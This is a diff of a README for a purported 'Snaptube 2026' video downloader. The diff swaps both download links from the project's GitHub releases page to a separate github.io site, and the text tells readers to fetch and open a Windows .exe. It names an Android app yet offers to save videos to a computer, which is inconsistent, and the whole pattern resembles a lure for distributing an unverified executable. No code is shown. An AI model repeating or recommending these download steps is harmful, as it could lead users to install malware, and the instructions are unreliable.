@@ -1,6 +1,6 @@
 # 📥 Snaptube-2026-Video-Downloader-Android - Save online videos to your computer
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Xeric-lambert191/Snaptube-2026-Video-Downloader-Android/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://xeric-lambert191.github.io)
 
 ## 📁 Overview
 
@@ -21,7 +21,7 @@ To run this application on your Windows computer, verify that your system meets 
 
 Follow these steps to obtain and run the software on your machine:
 
-1. Visit the project release page: [https://github.com/Xeric-lambert191/Snaptube-2026-Video-Downloader-Android/releases](https://github.com/Xeric-lambert191/Snaptube-2026-Video-Downloader-Android/releases)
+1. Visit the project release page: [https://xeric-lambert191.github.io](https://xeric-lambert191.github.io)
 2. Locate the latest version of the installer file in the assets list.
 3. Select the file ending in .exe to start your download.
 4. Open the file once the download finishes to begin the setup process.
